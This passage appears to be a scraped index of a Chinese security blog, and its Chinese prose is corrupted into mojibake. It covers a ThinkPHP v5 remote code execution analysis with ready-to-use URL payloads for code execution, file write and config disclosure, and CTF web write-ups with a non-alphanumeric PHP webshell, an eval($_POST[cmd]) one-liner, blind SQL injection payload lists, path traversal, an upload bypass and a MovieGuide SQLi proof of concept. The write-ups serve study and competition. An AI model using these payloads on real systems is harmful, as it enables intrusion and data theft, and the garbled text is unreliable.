è·å–å½“å‰æ“ä½œå $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; ç®€å•æè¿°execå‡½æ•°ï¼Œå®ä¾‹åŒ–controllerï¼Œç”¨äºåé¢20è¡Œåˆ°55è¡Œçš„é—­åŒ…å‡½æ•°ï¼Œè¿™ä¸ªå¿…æŠ¥å‡½æ•°ä¸»è¦å®Œæˆäº†è°ƒç”¨controllerçš„actionï¼Œå¹¶è·å–è¾“å…¥çš„å‚æ•°å€¼ï¼Œæœ€åç”±invokeReflectMethodå®Œæˆä¸»è¦çš„è°ƒç”¨ã€‚æœ€ç»ˆçš„è°ƒç”¨å‡½æ•°ä¸ºRequest::filterValueå‡½æ•°123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤ $value = call_user_func($filter, $value);//è°ƒç”¨å‡½æ•° &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // æ­£åˆ™è¿‡æ»¤ if (!preg_match($filter, $value)) &#123; // åŒ¹é…ä¸æˆåŠŸè¿”å›é»˜è®¤å€¼ $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filterå‡½æ•°ä¸å­˜åœ¨æ—¶, åˆ™ä½¿ç”¨filter_varè¿›è¡Œè¿‡æ»¤ // filterä¸ºéæ•´å½¢å€¼æ—¶, è°ƒç”¨filter_idå–å¾—è¿‡æ»¤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; åˆ°è¿™é‡Œå…¶å®æ€è·¯å¾ˆæ˜æ˜¾ï¼Œåˆ©ç”¨/åˆ†å‰²å‡ºèƒ½åˆ©ç”¨çš„controllerï¼Œå¹¶è¾“å…¥ç›¸åº”çš„å‚æ•°å€¼ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾å¯åˆ©ç”¨çš„å‡½æ•°ã€‚v5.0ç‰ˆæœ¬ä¸­pocéƒ½èƒ½ç”¨ å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.usernameé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨\\think\\request/inputï¼ˆv5.0ç‰ˆæœ¬ä¸èƒ½ç”¨æ˜¯å› ä¸ºthink\\requestçš„æ„é€ å‡½æ•°ä¸ºprotectedï¼Œä¸å…è®¸åŠ¨æ€è°ƒç”¨ï¼‰å¦‚ä»»æ„ä»£ç æ‰§è¡Œ?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunctionæ ¸å¿ƒReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1å› ä¸ºthink\\appç»§æ‰¿è‡ªthink\\containerï¼Œæ‰€ä»¥æ”¹æˆthink\\appä¹Ÿè¡Œå…¶ä¸­call_user_funcå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°call_user_func_arrayå¡«å……å‚æ•°æ—¶ï¼Œä»¥æ•°ç»„å½¢å¼ï¼Œç¬¬ä¸€ä¸ªä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªä¸ºå‡½æ•°å‚æ•°ï¼ˆä¹Ÿä¸ºæ•°ç»„å½¢å¼ï¼‰è¿™é‡Œv5.1åªèƒ½ç”¨php7ï¼Œå¦‚v5.0è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œå‡½æ•° æ€»ç»“è¿™æ¬¡å‡ºçš„è¿™ä¸ªæ¼æ´å±å®³å¾ˆå¤§ï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ä¹Ÿéå¸¸æ¼‚äº®ï¼Œå€¼å¾—ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ã€‚å…¶ä¸­æ”¶è·å¤§è‡´å°±æ˜¯äº†è§£äº†thinkphp v5ç‰ˆæœ¬è·¯ç”±è°ƒç”¨çš„æµç¨‹ï¼Œv5.1ç‰ˆæœ¬çš„é—­åŒ…å‡½æ•°æ„é€ çš„æ–¹å¼ç»™æ¡†æ¶å¸¦æ¥äº†ä¸ä¸€æ ·çš„æ„Ÿå—ï¼Œä¸å¾—ä¸ç»™thinkphpä¸€ä¸ªèµ"},{"title":"ã€CTFã€‘SUCTF 2018 éƒ¨åˆ†web writeup","permalink":"http://blog.0kami.cn/2018/05/28/suctf-part-web-writeup/","text":"SUCTFæŠ½äº†ç‚¹æ—¶é—´åšäº†2é“SUCTFçš„webé¢˜ï¼Œè®°å½•ä¸€ä¸‹writeupã€‚ Anonymousè€ƒç‚¹phpçš„åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼Œä»¥åŠcreate_functionæ‰€è¿”å›çš„åŒ¿åå‡½æ•° wpè®¿é—®é¢˜ç›®ï¼Œç›´æ¥ç»™äº†æºç 12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // æ‰§è¡Œäº†catå‘½ä»¤ï¼Œè¯»å–flagå†…å®¹$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; æ€è·¯æ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯æƒ³åŠæ³•æ‰§è¡Œcreate_functionæ‰€äº§ç”Ÿçš„åŒ¿åå‡½æ•°ã€‚è€Œå…¶ä¸­SUCTF_32ï¼Œè¿™ä¸ªå‡½æ•°æ˜ç¡®æ˜¯æ²¡åŠæ³•çˆ†ç ´å‡ºæ¥çš„ã€‚é‚£ä¹ˆå°±åªèƒ½åœ¨ $MY ä¸Šä¸‹åŠŸå¤«ã€‚æ‰“å°ä¸€ä¸‹$MYçš„å€¼ï¼Œå‘ç°create_functionè¿”å›äº†\\0lambda_{number},é‚£ä¹ˆå°±å¾ˆæ˜ç¡®äº†ï¼Œåªè¦æš´åŠ›ä¸€ä¸‹è¿™ä¸ªnumberå°±æœ‰ä¸€å®šå‡ ç‡æ‰§è¡Œè¯¥å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æš´åŠ›äº†å¤§æ¦‚1000å¤šå°±æœ‰2æ¡æ‰§è¡Œäº† Getshellè€ƒç‚¹https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp é¦–å…ˆç¡®å®šå¯ç”¨å­—ç¬¦ï¼Œä½¿ç”¨bpå°†æ‰€æœ‰å¯è§å­—ç¬¦æš´åŠ›ä¸€éåå‘ç°å¯æ‰“å°å­—ç¬¦ä¸º$ () [] _ ~ . ; =ï¼Œä»¥åŠå…¶ä»–ä¸å¯æ‰“å°å­—ç¬¦ã€‚ æ ¹æ®pç‰›çš„åšå®¢ï¼Œå‘ç°å–åä¸­æ–‡å¯ä»¥èµ·åˆ°ä½œç”¨ï¼Œæµ‹è¯•~({ä¸­æ–‡})å‘ç°å¯æ ¹æ®ä¸­æ–‡çš„utf-8ç¼–ç çš„ä¸­é—´2ä¸ªhexç è¿›è¡Œå¯¹å­—æ¯çš„éå†http://www.herongyang.com/gb2312_gb/pinyin_32.html å‡‘å‡ºå­—ç¬¦assertï¼Œ_GETï¼Œå¹¶åŠ¨æ€æ‰§è¡Œã€‚ä¸ºäº†å‡‘å‡ºä¸Šé¢çš„å­—ç¬¦ï¼Œæˆ‘é‡‡ç”¨é€ä¸ªåå–åbin2hex(~(&#39;a&#39;))è·å¾—ä¸­æ–‡utf-8ç¼–ç çš„ä¸­é—´2ä¸ªï¼Œæœè¡¨å³å¯æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–‡ï¼Œå†™ä¸€ä¸‹æˆ‘çš„getshellä»£ç  123456789101112131415161718192021222324&lt;?php$_=~(ç);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(æŒŸ);$__.=$_[[]==[]];$_=~(éš™);$__.=$_[[]==[]];$_=~(å¸);$__.=$_[[]==[]];$_=~(å‹‹);$__.=$_[[]==[]];$_=~(æ ¡);$___.=$_[[]==[]];$_=~(ä¸‹);$___.=$_[[]==[]];$_=~(çº¤);$___.=$_[[]==[]];$_=~(å«Œ);$___.=$_[[]==[]];$___=$$___;$__($___[_]); ä¸Šä¼ äº†shellä¹‹åå°±æ¯”è¾ƒå®¹æ˜“äº†ï¼Œç¿»ç›®å½•å³å¯ 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) æ€»ç»“è®°å½•ä¸€ä¸‹getshellçš„å‘ç‚¹ evalä¸æ˜¯å‡½æ•°ï¼Œæ˜¯è¯­å¥ ä¸ç”¨å¼•å·ï¼Œç”¨ä¸­æ–‡ä¹Ÿè¢«phpå½“ä½œæ˜¯å­—ç¬¦ä¸² UTF-8ç¼–ç  http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"ã€CTFã€‘DDCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/","text":"DDCTF 2018 2é“WEB Writeup WEB00 æ•°æ®åº“çš„ç§˜å¯†step 1:index.php éœ€è¦ä»¥IP:116.85.43.88è®¿é—®ï¼Œhttpå¤´åŠ å…¥ X-Forwarded-For: 116.85.43.88 ç»•è¿‡ step 2:ç»•è¿‡åæ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åŠŸèƒ½ï¼Œç®€å•æµ‹è¯•åå‘ç°id,title,dateæœ‰å®‰å…¨å¤„ç†ï¼Œä½†æ˜¯è¡¨å•ä¸­è¿˜éšè—ç€authorï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚ä»¥payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%ã€a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%ç¡®å®šæ³¨å…¥å­˜åœ¨,æƒ³ç€ç”¨unionç›´æ¥æå–å‡ºæ¥ï¼Œå‘ç°åå°è¿˜æœ‰WAFï¼Œæ²¡ç»•è¿‡å»ï¼Œä½†æ˜¯å¯¹äºç›²æ³¨ï¼ŒæˆåŠŸæ„é€ å‡ºäº†payloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,å‘ç”Ÿ5ç§’å»¶è¿Ÿã€‚ï¼ˆåæ¥æƒ³æƒ³å…¶å®å¯ä»¥ç”¨boolå‹ç›²æ³¨æå–æ•°æ®ï¼‰ step 3:ç¡®è®¤äº†authorå­—æ®µå¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯sha1æ ¡éªŒï¼Œè¦æƒ³å†™è„šæœ¬ï¼Œå¿…é¡»å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç ”ç©¶äº†ä¸€ä¸‹main.jsï¼Œå‘ç°ä»¥ç±»ä¼¼id=title=date=author=time=çš„å­—ç¬¦ä¸²sha1å¤„ç†ååå°æ ¡éªŒ step 4:å†™è„šæœ¬ï¼Œä¸»è¦åŒ…æ‹¬sha1æ ¡éªŒå’Œæ—¶é—´ç›²æ³¨ï¼Œè´´ä¸€ä¸‹payload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°åº“å ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# è·å–åˆ°è¡¨å message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°åˆ—å ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# è·å–åˆ°flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 ä¸“å±é“¾æ¥step 1:æ ¹æ®é¢˜ç›®æç¤ºï¼Œé¢˜ç›®åªè·Ÿé“¾æ¥IPæœ‰å…³ï¼Œæ‰€ä»¥ä¸»è¦æœ‰1234http://116.85.48.102:5050/welcom/uuid #ä¸»é¡µ æ³¨æ„åˆ°ä¸Šé¢æœ‰email:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # ç»™äº†æç¤ºï¼Œåªèƒ½ä¸‹è½½.class,.ks,.ico,.xmlæ–‡ä»¶http://116.85.48.102:5050/news/topFiveNews # æ²¡ç”¨http://116.85.48.102:5050//flag/testflag/yourflag #è®¿é—®æŠ¥é”™ï¼Œä½†æ˜¯æš´éœ²äº†æ§åˆ¶å™¨è·¯å¾„com.didichuxing.ctf.controller.user.FlagController.java step 2:é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯çŒœè·¯å¾„äº†ï¼Œåœ¨githubä¸Šæ‰¾äº†ä¸ªspringmvc+mybatisçš„é¡¹ç›®,ç»è¿‡æµ‹è¯•ï¼Œå‘ç°ä¸€ä¸‹å‡ ä¸ªæ–‡ä»¶ ../../WEB-INF/web.xml # å¾—åˆ°WEB-INF/applicationContext.xmlï¼Œcom.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # å¾—åˆ°classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # å¾—åˆ°mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sqlè¯­å¥ ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # å¯†é’¥æ–‡ä»¶ ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:æŠŠä¸Šè¿°çš„classæ–‡ä»¶åœ¨çº¿åç¼–è¯‘åˆ°javaï¼Œé˜…è¯»åå‘ç°flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; ä»¥ç”¨æˆ·çš„é‚®ç®±æ¥è·å–åŠ å¯†çš„flagï¼Œé‚®ç®±å°±æ˜¯é¦–é¡µä¸Šçš„é‚®ç®±ï¼Œç„¶åé€šè¿‡listener.javaå¾—åˆ°å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); å¯ä»¥çœ‹åˆ°Emailè¢«è½¬åŒ–ä¸º16è¿›åˆ¶çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦å…ˆå¯¹é‚®ç®±åšå¤„ç†ï¼Œç®€å•ç¼–å†™ä»£ç ï¼ˆåé¢æ”¾ä¸Šæ¥ï¼‰ï¼Œå¾—åˆ°8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27ï¼Œä»¥http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27è¯·æ±‚åå¾—åˆ°åŠ å¯†çš„flagã€‚ step 4:æ¥ä¸‹æ¥å°±æ˜¯å†™ä»£ç è§£å¯†flagäº†ï¼Œå› ä¸ºå¯†é’¥æ–‡ä»¶åœ¨æ‰‹ï¼Œåªéœ€ç¼–å†™ç¨‹åºå³å¯ï¼Œå‚è€ƒhttps://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qaéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨äº†ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ã€‚è§£å¯†åå¾—åˆ°flag"},{"title":"ã€CTFã€‘HITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/hitb-xctf-2018-portion-web-writeup/","text":"upload è€ƒç‚¹windowså¹³å°çš„ä¸€äº›ç‰¹æ€§ windowså¹³å°ç‰¹æ€§windowsä¸‹æœç´¢æ–‡ä»¶ç”¨åˆ°çš„æ˜¯FindFirstFileï¼Œè¯¥å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†&quot;&lt;&quot; =&gt; &quot;*&quot;ã€&quot;&gt;&quot; =&gt; &quot;?&quot;ã€&quot; =&gt; .ï¼Œæ‰€ä»¥åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§ã€‚e.g. `?filename=a&gt; =&gt; a?` åŒ¹é…å•ä¸ªå­—ç¬¦ `?filename=a&lt; =&gt; a*` åŒ¹é…å¤šä¸ªå­—ç¬¦ `?filename=a&quot; =&gt; a.` NTFS ADSç‰¹æ€§ ä¸Šä¼ çš„æ–‡ä»¶å ç³»ç»Ÿç»“æœ test.php:a.jpg ç”Ÿæˆtest.phpï¼Œä½†æ˜¯æ— å†…å®¹ test.php::$DATA ç”Ÿæˆtest.phpï¼Œæœ‰å†…å®¹ test.php::$INDEX_ALLOCATION ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹ test.php::$DATA.jpg ç”Ÿæˆ0.jpgï¼Œæœ‰å†…å®¹ test.php::$DATA\\test.jpg ç”Ÿæˆaaa.jpgï¼Œæœ‰å†…å®¹ è¿‡ç¨‹ step 1:åŠŸèƒ½ç‚¹#æ–‡ä»¶ä¸Šä¼  #ä¸Šä¼ æ–‡ä»¶å®½é«˜ =&gt; getshellç¯å¢ƒï¼šIIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é»‘åå•phpï¼Œæ–‡ä»¶åå‰ç¼€æ—¶é—´æˆ³é‡å†™ï¼Œä½†æˆªå–ä¸Šä¼ æ–‡ä»¶åçš„æœ€åä¸€ä¸ªåç¼€ä¸å˜ã€‚ç®€å•åˆ©ç”¨ADSç‰¹æ€§ï¼Œä¸Šä¼ test.php::$DATA step 3:ä¸Šä¼ äº†æ–‡ä»¶åï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶ç›®å½•ã€‚pic.phpè¿”å›äº†ä¸Šä¼ æ–‡ä»¶å®½å’Œé«˜ï¼ŒçŒœæµ‹å…¶ä½¿ç”¨äº†getimagesizeï¼Œæƒ³åˆ°å‰æ®µæ—¶é—´çš„ä¸€ç¯‡å¸–å­ï¼Œå†™ä¸ªè„šæœ¬è·‘è¯¥å¤æ‚ç›®å½• 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break å¾—åˆ°ç›®å½•87194f13726af7cee27ba2cfe97b60df step 4:æœ‰äº†ç›®å½•å°±èƒ½è®¿é—®ä¸Šä¼ çš„ä¸€å¥è¯&lt;?php eval($_POST[cmd]);?&gt;ï¼Œç³»ç»Ÿç¦ç”¨äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œä¸æˆªå›¾äº†cmd=var_dump(glob(&quot;../*&quot;));å¾—åˆ°flag.phpï¼Œè®¿é—®åå‘ç°éœ€è¦è¯»å–flag.phpçš„å†…å®¹cmd=echo readfile(&quot;../flag.php&quot;);å¾—åˆ°flag æ€»ç»“è¿™æ¬¡å°±åšäº†ä¸€é“webï¼Œè¿˜æœ‰å¾…æé«˜å’Œç§¯ç´¯:)"},{"title":"ã€Code Analysisã€‘MovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç²—ç³™çš„å¼€æºcmsï¼Œæ€»ä½“æ¥è¯´å¹¶æ²¡æœ‰å¯¹è¾“å…¥è¾“å‡ºåšå®‰å…¨å¤„ç†ï¼Œä»PoCå…¥æ‰‹ï¼Œé€‰ä¸€ä¸ªè¿˜åŸä¸€ä¸‹æ¼æ´å½¢æˆè¿‡ç¨‹ã€‚ PoCï¼šindex.php?md=[SQL]å®šä½ä¸€ä¸‹mdå‚æ•°layout.phpä¸ºè¯¥cmsçš„ä¸»è¦å…¥å£å¤„ç†,ä¸‹è¿°çš„å˜é‡å‡æ²¡æœ‰é€šè¿‡å®‰å…¨å¤„ç†ï¼Œç›´æ¥SQLè¯­å¥ï¼Œä»è€Œéƒ½å¯ä»¥ç”¨äºæ•°æ®åº“æ³¨å…¥ã€‚12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); ç›´æ¥æ‹¼æ¥å…¥SQLè¯­å¥1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å®ƒçš„PoCï¼Œä»¥å‰æ²¡æœ‰è§è¿‡ç±»ä¼¼çš„:bï¼ŒPoCä¸­ä½¿ç”¨äº†export_setå‡½æ•° EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of âˆ’1 is effectively the same as 64. åˆ†è§£ä¸€ä¸‹PoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - è¿™é‡Œä¸»è¦åˆ©ç”¨çš„æ˜¯export_setå‡½æ•°çš„noï¼Œoffä½ç½®æ¥dumpæ•°æ®ã€‚ é¦–å…ˆé€šè¿‡@a:=0ï¼Œå®šä¹‰å˜é‡aä¸º0ï¼ˆå¯èƒ½è·Ÿmysqlç‰ˆæœ¬æœ‰å…³ç³»ï¼Œ5.7.xä¸‹çš„mysqlæ— æ³•ç”¨@:=0æ¥å®šä¹‰ï¼‰ æœ€é‡Œé¢çš„export_setï¼Œå°†table_name dumpå‡ºæ¥ï¼ˆç»“æœä¸º0&lt;li&gt;table_nameï¼‰ æ¥ä¸‹æ¥çš„ä¸€ä¸ªexport_setï¼Œå°†columns_name dumpå‡ºæ¥(ç»“æœä¸º0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)å°†ä¸Šè¿°çš„æ•°æ®èµ‹å€¼ç»™å˜é‡a æœ€åç”¨æœ€åä¸€ä¸ªexport_setï¼Œç”¨@aåšåˆ†éš”ç¬¦ï¼Œå°†æ•°æ®dumpå‡ºæ¥ 0x02 æ€»ç»“è¯¥cmsçš„æ³¨å…¥æ¼æ´å¾ˆå¸¸è§„ï¼Œä¸»è¦æ˜¯å­¦ä¹ åˆ†æäº†è¯¥PoCï¼Œèƒ½åœ¨æœªæ¥æ³¨å…¥ç»•è¿‡çš„åœ°æ–¹åº”ç”¨ã€‚ mysqlçš„è‡ªå®šä¹‰å˜é‡@çš„åº”ç”¨ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ¶ˆé™¤ç©ºæ ¼ï¼Œä»¥åŠæ­£åˆ™\\bwhere\\bçš„ç»•è¿‡ /!02222select*/è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯ç»å¸¸å¬è¯´ï¼Œä¹Ÿåœ¨è¿™é‡Œç”¨åˆ°äº†ï¼Œä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ 